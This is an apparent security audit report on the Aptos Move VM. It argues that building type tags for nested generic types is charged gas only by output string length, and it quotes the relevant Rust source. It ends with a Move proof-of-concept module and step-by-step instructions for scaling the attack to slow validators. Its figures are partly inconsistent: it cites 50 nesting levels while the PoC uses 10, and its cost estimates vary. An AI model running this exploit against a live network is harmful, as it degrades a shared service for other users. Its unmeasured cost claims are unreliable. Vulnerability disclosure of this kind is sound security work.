# Audit Report

## Title
Type Tag Construction Gas Undercharging Allows Resource Exhaustion via Complex Generic Types

## Summary
Type tag construction for deeply nested generic types in the Move VM runtime consumes computational resources (measured by pseudo-gas up to 5000 units) that are not proportionally charged to the transaction gas meter. Instead, native functions only charge gas based on the final type tag string length, creating a discrepancy that allows attackers to consume disproportionate validator CPU resources relative to gas paid.

## Finding Description

The Move VM implements a two-tier gas system for type tag construction that creates an exploitable discrepancy:

**Tier 1: Pseudo-Gas Metering (Internal Complexity Limiting)** [1](#0-0) 

The `PseudoGasContext` meters type complexity with production limits:
- `type_max_cost: 5000` 
- `type_base_cost: 100` (charged per type node)
- `type_byte_cost: 1` (charged per byte of struct identifiers) [2](#0-1) 

This allows approximately 50 type nodes before hitting the limit (comment: "5000 limits type tag total size < 5000 bytes and < 50 nodes").

**Tier 2: Transaction Gas Charging (Output-Based)**

However, the pseudo-gas metering is NOT connected to the transaction gas meter. The `ty_to_ty_tag()` function performs all computational work without charging transaction gas: [3](#0-2) 

Native functions charge gas AFTER construction based only on output string length: [4](#0-3) 

The TODO comments explicitly acknowledge this issue: [5](#0-4) [6](#0-5) 

**Gas Charging Formula:**
- Base cost: 1102 gas units
- Per-byte cost: 18 gas units per byte of type string
- Total: `1102 + 18 * strlen(type_tag)` [7](#0-6) 

**Attack Path:**

1. Attacker crafts a Move type with maximum complexity (consuming ~4999 pseudo-gas):
   - Deeply nested generics: `Foo<Bar<Baz<Qux<...>>>>` (up to 50 levels)
   - Uses short struct/module names to minimize output string size

2. Attacker calls `type_info::type_of<ComplexType>()` or event functions repeatedly within a transaction

3. Each call performs expensive operations:
   - 50 recursive function calls through `ty_to_ty_tag_impl()`
   - 50 struct name lookups from hash maps
   - Multiple string allocations and concatenations
   - Cache operations

4. Transaction only pays for output size (e.g., ~500 bytes = 10,102 gas) despite consuming 5000 "pseudo-gas" worth of computational work

**Invariant Violation:**
This breaks the **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits." The computational cost is bounded but not proportionally charged, allowing cheap transactions to consume expensive validator resources.

## Impact Explanation

**Medium Severity** - This qualifies as a gas metering discrepancy enabling resource exhaustion:

1. **Validator Node Slowdowns**: An attacker can craft transactions that appear gas-efficient but consume disproportionate CPU resources during execution. Each type tag construction involves 50+ recursive operations, hash map lookups, and memory allocations that are significantly more expensive than the gas charged suggests.

2. **Transaction Spamming**: By repeatedly calling type operations with complex types, an attacker can fill blocks with computationally expensive transactions while paying minimal gas, degrading validator performance.

3. **Gas Model Inaccuracy**: The discrepancy undermines the gas model's purpose of accurately pricing computational resources, potentially affecting network economics and validator incentives.

While the pseudo-gas limits prevent UNBOUNDED computation (avoiding Critical severity), the bounded discrepancy still allows meaningful resource consumption attacks that degrade network performance without proportional cost to the attacker.

## Likelihood Explanation

**High Likelihood** - This vulnerability is easily exploitable:

1. **No Special Access Required**: Any user can call `type_info::type_of<T>()` or emit events with complex types
2. **Publicly Accessible**: The type_info module is part of the standard library
3. **Simple to Execute**: Attack only requires defining complex generic structs and calling native functions
4. **Repeatable**: Can be exploited in every transaction at minimal cost
5. **Already Acknowledged**: TODO comments indicate developers are aware but haven't fixed it

The attack requires minimal sophistication—just defining nested generic types and calling standard library functions.

## Recommendation

**Immediate Fix**: Charge transaction gas proportional to pseudo-gas consumed during type tag construction.

Modify the native functions to charge for the actual construction work:

```rust
// In native_type_of and native_type_name
pub fn type_to_type_tag_with_gas_charging(
    &mut self, 
    ty: &Type
) -> PartialVMResult<TypeTag> {
    // Create pseudo-gas context to track cost
    let mut gas_context = PseudoGasContext::new(self.vm_config());
    let ty_tag = self.ty_to_ty_tag_impl(ty, &mut gas_context)?;
    
    // Charge transaction gas proportional to pseudo-gas consumed
    let pseudo_gas_consumed = gas_context.current_cost();
    self.charge(TYPE_TAG_CONSTRUCTION_PER_UNIT * pseudo_gas_consumed)?;
    
    Ok(ty_tag)
}
```

**Long-term Solution**:
1. Unify pseudo-gas and transaction gas metering for type operations
2. Remove output-based charging in favor of work-based charging
3. Add gas parameter `TYPE_INFO_TYPE_TAG_CONSTRUCTION_PER_PSEUDO_GAS_UNIT` to the gas schedule [8](#0-7) 

## Proof of Concept

```move
// File: sources/gas_exploit_poc.move
module attacker::gas_exploit {
    use aptos_std::type_info;
    
    // Deeply nested generic types to maximize pseudo-gas consumption
    struct L0<T> has drop {}
    struct L1<T> has drop {}
    struct L2<T> has drop {}
    struct L3<T> has drop {}
    struct L4<T> has drop {}
    struct L5<T> has drop {}
    struct L6<T> has drop {}
    struct L7<T> has drop {}
    struct L8<T> has drop {}
    struct L9<T> has drop {}
    
    // Maximum nesting approaching pseudo-gas limit
    public entry fun exploit_gas_undercharging() {
        // This type consumes significant pseudo-gas (recursive traversal)
        // but pays minimal transaction gas (small output string)
        let _ = type_info::type_of<
            L9<L8<L7<L6<L5<L4<L3<L2<L1<L0<u8>>>>>>>>>>
        >();
        
        // Repeat multiple times in one transaction
        let _ = type_info::type_of<L9<L8<L7<L6<L5<L4<L3<L2<L1<L0<u64>>>>>>>>>>>();
        let _ = type_info::type_of<L9<L8<L7<L6<L5<L4<L3<L2<L1<L0<u128>>>>>>>>>>>();
        let _ = type_info::type_of<L9<L8<L7<L6<L5<L4<L3<L2<L1<L0<address>>>>>>>>>>>();
        
        // Each call: ~1000-2000 pseudo-gas work
        // Total gas charged: ~4 * (1102 + 18 * 200) ≈ 19,000 gas units
        // Actual computational cost: 50+ recursive calls per invocation
    }
    
    #[test]
    fun test_gas_discrepancy() {
        // Measure gas consumption for complex vs simple types
        // Expected: Complex type pays similar gas to simple type
        // despite significantly more computational work
        exploit_gas_undercharging();
    }
}
```

**Exploitation Steps:**
1. Deploy the module with deeply nested generic struct definitions
2. Submit transactions calling `exploit_gas_undercharging()` repeatedly
3. Monitor validator CPU usage vs gas charged
4. Observe disproportionate CPU consumption relative to transaction gas cost
5. Scale attack with multiple transactions to degrade network performance

**Expected Result**: Validators spend significantly more CPU cycles processing these transactions than the gas charged would suggest, enabling resource exhaustion attacks at minimal cost to the attacker.

### Citations

**File:** third_party/move/move-vm/runtime/src/storage/ty_tag_converter.rs (L15-63)
```rust
struct PseudoGasContext {
    // Parameters for metering type tag construction:
    //   - maximum allowed cost,
    //   - base cost for any type to tag conversion,
    //   - cost for size of a struct tag.
    max_cost: u64,
    cost: u64,
    cost_base: u64,
    cost_per_byte: u64,
}

impl PseudoGasContext {
    fn new(vm_config: &VMConfig) -> Self {
        Self {
            max_cost: vm_config.type_max_cost,
            cost: 0,
            cost_base: vm_config.type_base_cost,
            cost_per_byte: vm_config.type_byte_cost,
        }
    }

    fn current_cost(&mut self) -> u64 {
        self.cost
    }

    fn charge_base(&mut self) -> PartialVMResult<()> {
        self.charge(self.cost_base)
    }

    fn charge_struct_tag(&mut self, struct_tag: &StructTag) -> PartialVMResult<()> {
        let size =
            (struct_tag.address.len() + struct_tag.module.len() + struct_tag.name.len()) as u64;
        self.charge(size * self.cost_per_byte)
    }

    fn charge(&mut self, amount: u64) -> PartialVMResult<()> {
        self.cost += amount;
        if self.cost > self.max_cost {
            Err(
                PartialVMError::new(StatusCode::TYPE_TAG_LIMIT_EXCEEDED).with_message(format!(
                    "Exceeded maximum type tag limit of {} when charging {}",
                    self.max_cost, amount
                )),
            )
        } else {
            Ok(())
        }
    }
}
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L246-249)
```rust
        // 5000 limits type tag total size < 5000 bytes and < 50 nodes.
        type_max_cost: 5000,
        type_base_cost: 100,
        type_byte_cost: 1,
```

**File:** third_party/move/move-vm/runtime/src/native_functions.rs (L164-166)
```rust
    pub fn type_to_type_tag(&self, ty: &Type) -> PartialVMResult<TypeTag> {
        self.module_storage.runtime_environment().ty_to_ty_tag(ty)
    }
```

**File:** aptos-move/framework/src/natives/type_info.rs (L55-65)
```rust
    context.charge(TYPE_INFO_TYPE_OF_BASE)?;

    let type_tag = context.type_to_type_tag(&ty_args[0])?;

    if context.eval_gas(TYPE_INFO_TYPE_OF_PER_BYTE_IN_STR) > 0.into() {
        let type_tag_str = type_tag.to_canonical_string();
        // Ideally, we would charge *before* the `type_to_type_tag()` and `type_tag.to_string()` calls above.
        // But there are other limits in place that prevent this native from being called with too much work.
        context
            .charge(TYPE_INFO_TYPE_OF_PER_BYTE_IN_STR * NumBytes::new(type_tag_str.len() as u64))?;
    }
```

**File:** aptos-move/framework/src/natives/type_info.rs (L92-98)
```rust
    context.charge(TYPE_INFO_TYPE_NAME_BASE)?;

    let type_tag = context.type_to_type_tag(&ty_args[0])?;
    let type_name = type_tag.to_canonical_string();

    // TODO: Ideally, we would charge *before* the `type_to_type_tag()` and `type_tag.to_string()` calls above.
    context.charge(TYPE_INFO_TYPE_NAME_PER_BYTE_IN_STR * NumBytes::new(type_name.len() as u64))?;
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/aptos_framework.rs (L272-274)
```rust
        [type_info_type_of_base: InternalGas, "type_info.type_of.base", 1102],
        // TODO(Gas): the on-chain name is wrong...
        [type_info_type_of_per_byte_in_str: InternalGasPerByte, "type_info.type_of.per_abstract_memory_unit", 18],
```
